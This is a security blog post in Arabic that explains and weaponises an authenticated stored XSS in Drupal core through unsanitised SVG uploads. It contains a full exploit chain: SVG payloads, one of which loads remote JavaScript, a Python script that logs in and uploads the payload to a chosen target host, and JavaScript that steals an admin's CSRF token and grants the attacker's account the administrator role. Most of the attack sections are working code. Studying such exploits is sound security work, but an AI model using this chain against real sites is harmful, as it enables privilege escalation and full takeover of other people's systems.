---
title: Auth Stored XSS Affects ALL Drupal Core Versions
author: Mesh3l_911
date: 2022-03-13 18:32:00 -0500
categories: [Blogging, Tutorial]
tags: [JWKS, JWT]
---


<p class="aligncenter">
    <img src="/pics/LOGO.png" alt="centered image" />
</p>

<center><b> ^_^ السلام عليكم ورحمة الله وبركاته, يالله حيهم </b></center><br> 


> <html><body><b><p style="color:#A52A2A;font-size:25px">Agenda:</p></b></body></html>

<ul><li><b>Authenticated Stored XSS Affects All Drupal Core Versions</b></li></ul>
<ul><li><b>Exploit Development:</b>
 <ul class="square">
  <li>Triggering the vulnerability (Basic POC)</li>
  <li>Uploading SVG File Using Python</li>
  <li>XSS to Bypaass the Anti-CSRF Token Using XMLHttpRequest (XHR)</li>
  <li>Escalating Our Privilage to Administrator Using XMLHttpRequest (XHR)</li>
 </ul>
</li></ul>
<br><br>

> <html><body><b><p style="color:#A52A2A;font-size:25px">Authenticated Stored XSS Affects All Drupal Core Versions:</p></b></body></html>

  الله يمسيكم/يصبحكم بالخير.
  

:موضوع بسيط الهدف منه بالنسبة لي نقطتين أساسية
 
 <ul><li><b> راح تعطيك فهم كافي للتطبيق بيساعدك في إكتشاف ثغرات أخرى POCs for CVEs كتابة </b></li></ul>
 <ul><li><b>
 Chaining/Escalation Mindset التفكير دائما بأقصوى خطورة ممكنة للثغرة المكتشفة قبل كتابة التقرير 
   
 </b></li></ul>
 
 لآخر الثغرات في دروبال وهي POC في البداية كنت أحاول أكتب
 
 
 ```
 Arbitrary PHP code execution (CVE-2022-25277)
 # Drupal core - Critical - Arbitrary PHP code execution - SA-CORE-2022-014
```

   بعد ما إنتهيت صار عندي فهم بشكل كافي للـ
   
 File Upload Functionality Process

وهي سلمكم الله (بإختصار) قبل رفع أي ملف يتم مراجعة الإمتداد, هل هو موجود بالبلاك ليست ولالا؟ إذا كان موجود وإمتداد تيكست أيضا موجود


Will append a (.txt) extension

وتكون النتيجة

Mesh3l.php_.txt

غير كذا راح يمنعنا من إضافة الإمتداد

لكن لاحظت بأن الإمتداد

(.svg)

ماكان من ضمن البلاك ليست

`lib/Drupal/Core/File/FileSystemInterface.php`

![](../../posts_pics/INSECURE_EXTENSION_REGEX.png)

<br>
`modules/system/src/EventSubscriber/SecurityFileUploadEventSubscriber.php`

![](../../posts_pics/Appending.png)

على طول بدون ماأضيع وقت فكرت أرفع ملف

(.svg) 

وأشوف هل يصير أي نوع من الـ

Filtration/Sanitization 

لمحتوى الملف ولالا ؟
وللأسف الإجابة كانت لا وكانت موجودة بكل إصدارات دروبال 



<br><br>
> <html><body><b><p style="color:#A52A2A;font-size:25px">Exploit Development:</p></b></body></html>

زي ماقلت لكم فوق, هنا من قبل أفكر بأي شي ثاني عرفت إنه عن طريق الـ

XSS

عندنا القدرة نسوي أي آكشن ممكن يسويه الآدمن بمجرد زيارته للملف, عاد لكم أن تتخيلون كمية الآكشنز الموجودة بمشروع ضخم مثل دروبال

`ALERT IS NOT AN EXPLOITATION, it's nothing but a basic POC.`

طيب هنا فيه خيارات كثير جدا ممكن نسويها لكن أنا إخترت بكل بساطة نسجل حساب بصلاحيات محدودة وعن طريق الثغرة نجعل الآدمن يرفع صلاحيات الحساب إلى أعلى شي ممكن.

<br><br>
> <html><body><b><p style="color:#A52A2A;font-size:25px">Triggering the vulnerability (Basic POC):</p></b></body></html>

قبل كل شي نبدأ بأبسط شي ممكن والهدف منه التأكد من وجود الثغرة ومن هناك نبدأ بكتابة الإستغلال:

```python
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(911);
  </script>
</svg>
```

النتيجة:

![](../../posts_pics/Basic_POC.png)


  
<br><br>
> <html><body><b><p style="color:#A52A2A;font-size:25px">Uploading SVG File Using Python:</p></b></body></html>

بسم الله نبدأ بكتابة الإستغلال, فالبداية محتوى الملف إيش راح يكون؟ بكل بساطة أنا حطيت الإستغلال بملف

JavaScript

وإستخدمت 

xlink:href attribute

لتعريف محتوى الملف الخارجي اللي في هالحالة راح يكون موجود على.

http://127.0.0.1:8000/exploit.js

```python

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <script xlink:href="http://127.0.0.1:8000/exploit.js"/>
</svg>

```

طيب الآن الخطوة الأخيرة وهي رفع الملف بإستخدام صلاحيتنا المحدودة وبعدها ننتظر الآدمن يزور الملف ليتم تنفيد المحتوى الموجود واللي راح نفصل فيه فالسكشن التالي بإذن الله.

هذا السكريبت النهائي اللي راح يرفع لنا الملف بإستخدام بايثون:

```python
import requests, optparse, sys
from bs4 import BeautifulSoup

#OptionsParser
def Args():
    Parser = optparse.OptionParser()
    Parser.add_option("--host", "-H", dest="host", help="The Targeted Host")
    Parser.add_option("--folder", "-f", dest="WebRoot", help="The WebRoot Folder")
    Parser.add_option("--user", "-u", dest="username", help="Username")
    Parser.add_option("--pass", "-p", dest="password", help="Password")
    Parser.add_option("--exploit", "-e", dest="exploit", help="The External JS Exploit Path")
    (arguments, values) = Parser.parse_args()
    return arguments

def upload(host, WebRoot, username, password, exploit):

    #Check if the provided host is using HTTP or HTTPS
    if(requests.get("http://"+host).status_code == 200):   
        targetUrl = 'http://{}/{}'.format(host, WebRoot)
    else:
        targetUrl = 'https://{}/{}'.format(host, WebRoot)
    
    #Initiating the login request
    body = {
        "name" : username,
        "pass" : password,
        "form_id" : "user_login_form",
        "op" : 'Log in'
    }
    session = requests.Session()
    session.post(targetUrl+"/user/login", data=body)
    print("\n[+] Logged in Successfully")

    #Parsing the response then extracting the Anti-CSRF Token
    print("\n[+] Extracting the Anti-CSRF Token ...")
    response = session.get(targetUrl+"/node/add/article").text
    token = BeautifulSoup(response, 'html.parser').find('input', {'name':'form_token'})['value']
    

    #Uploading the .svg file
    file = {
        'form_token' : (None, token),
        'form_id' : (None, "node_article_form"),
        'files[field_files_0][]' : ("POC.svg", '''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><script xlink:href="'''+exploit+'''"/></svg>''', "image/svg+xml"),
    }
    session.post(targetUrl+"/node/add/article?element_parents=field_f/widget&ajax_form=1&_wrapper_format=drupal_ajax&_wrapper_format=drupal_ajax", files=file)
    print("\n[+] Crafted request was sent and POC.svg has been uploaded ^_^")


def main():
    if len(sys.argv) == 11:
        arguments = Args()
        upload(arguments.host, arguments.WebRoot, arguments.username, arguments.password, arguments.exploit)
    else:
        print("Usage python POC.py -H localhost -f drupal-9.4.5 -u Mesh3l -p Mesh3l@.@..1 -e http://127.0.0.1:8000/exploit.js")

if __name__ == '__main__':
    main()
```

![](../../posts_pics/options.png)
<br>
![](../../posts_pics/POC_UPLOADED.png)
<br><br>

> <html><body><b><p style="color:#A52A2A;font-size:25px">XSS to Bypaass the Anti-CSRF Token Using XMLHttpRequest (XHR)</p></b></body></html>

قبل ننتقل لمحتوى الإستغلال النهائي كان فيه مع كل آكشن

Anti-CSRF Token

فعلشان نرسل الريكويست اللي راح ينفذ لنا المطلوب لازم يكون التوكن موجود, وعلى كل حال بمجرد وصولنا لـ

XSS 

فحن بإذن الله قادرين على تخطي 

 <ul class="square">
  <li>Anti-CSRF Tokens</li>
  <li>Referer/Origin Checks</li>
 </ul>

نرجع لموضوعنا, أنا هنا إستخدمت 

```js
//Extracting the Anti-CSRF Token
var XHR = new XMLHttpRequest();
XHR.onreadystatechange = function(){

    if(XHR.readyState == 4){
        var resonse = XHR.responseText;

        //Parsing the response so that we can extract the token using .getElementById
        var document = new DOMParser().parseFromString(resonse, "text/html");
        var csrfToken = document.getElementsByName("form_token")[0].value;

        //The csrfToken Value 
        alert(csrfToken);
    }
}

XHR.open('GET', 'http://localhost/drupal-9.4.5/user/2/edit', true);
XHR.send();
```
أرسلت 

GET Request

بعدها أخذنا محتوى الصفحة 

Response Text

سويت بارسنق عشان أقدر أستخدم

getElementsByName() method

وبكذا صار عندنا قيمة التوكن, كل اللي باقي علينا نكمل ونرسله مع الريكويست اللي يرفع لنا صلاحياتنا لأعلى صلاحية.

<br><br>

> <html><body><b><p style="color:#A52A2A;font-size:25px">Escalating Our Privilage to Administrator Using XMLHttpRequest (XHR)</p></b></body></html>


الخطوة الأخيرة وهي كتابة كامل الإستغلال:

```js
//A function to escalate the privilage to Administrator
function escalation(csrfToken){

    var requestBody = "-----------------------------3849105468677831259759672443\r\n" + 
    "Content-Disposition: form-data; name=\"mail\"\r\n" + 
    "\r\n" + 
    "Mesh3l@Mesh3l.local\r\n" + 
    "-----------------------------3849105468677831259759672443\r\n"+
    "Content-Disposition: form-data; name=\"name\"\r\n" + 
    "\r\n" + 
    "Mesh3l\r\n" + 
    "-----------------------------3849105468677831259759672443\r\n"+
    "Content-Disposition: form-data; name=\"roles[content_editor]\"\r\n" + 
    "\r\n" + 
    "content_editor\r\n" + 
    "-----------------------------3849105468677831259759672443\r\n"+
    "Content-Disposition: form-data; name=\"roles[administrator]\"\r\n" + 
    "\r\n" + 
    "administrator\r\n" + 
    "-----------------------------3849105468677831259759672443\r\n"+
    "Content-Disposition: form-data; name=\"form_token\"\r\n" + 
    "\r\n" + 
    ""+csrfToken+"\r\n" + 
    "-----------------------------3849105468677831259759672443\r\n"+
    "Content-Disposition: form-data; name=\"form_id\"\r\n" + 
    "\r\n" + 
    "user_form\r\n" + 
    "-----------------------------3849105468677831259759672443\r\n"+
    "Content-Disposition: form-data; name=\"op\"\r\n" + 
    "\r\n" + 
    "Save\r\n" + 
    "-----------------------------3849105468677831259759672443--";

    //Initaing the request that will escalate our privilage
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://localhost/drupal-9.4.5/user/2/edit", true);
    xhr.setRequestHeader("Content-Type","multipart/form-data; boundary=---------------------------3849105468677831259759672443");
    xhr.send(requestBody);
}

//Extracting the Anti-CSRF Token
var XHR = new XMLHttpRequest();
XHR.onreadystatechange = function(){

    if(XHR.readyState == 4){
        var resonse = XHR.responseText;

        //Parsing the response so that we can extract the token using .getElementById
        var document = new DOMParser().parseFromString(resonse, "text/html");
        var csrfToken = document.getElementsByName("form_token")[0].value;

        //Calling the escalation function and passing the csrfToken value to it
        escalation(csrfToken);
    }
}

XHR.open('GET', 'http://localhost/drupal-9.4.5/user/2/edit', true);
XHR.send();
```
<br>
![](../../posts_pics/PrivEsc.png)
<br>
وبكذا أول مايزور الآدمن الملف راح يتم تنفيذ هذ الكود والهدف منه زي ماقلنا رفع صلاحياتنا المحدودة إلى أعلى صلاحية.

:وهذا مقطع يوضح كل التفاصيل اللي فوق بشكل عملي
<br>
<ul><i class="fab fa-youtube"></i> <a href="https://www.youtube.com/watch?v=tTJEmredVdE"> Drupal's Core Authenticated Stored XSS POC</a></ul>
<br><br>

> <html><body><b><p style="color:#A52A2A;font-size:25px">Conclusion and References</p></b></body></html>

 بالختام, دعواتكم لي ولوالدي ولمن أحب.
 وإذا أحد عنده إضافة أبد البلوق للجميع وأنا أول الشاكرين ^_^
 
-   https://github.com/drupal/core/commit/1cd1830d79f221cc8490f53c2bb487dd07094f17
-   https://www.drupal.org/sa-core-2022-014
-   https://developer.mozilla.org/en-US/docs/Web/SVG/Attribute/xlink:href
-   https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementById

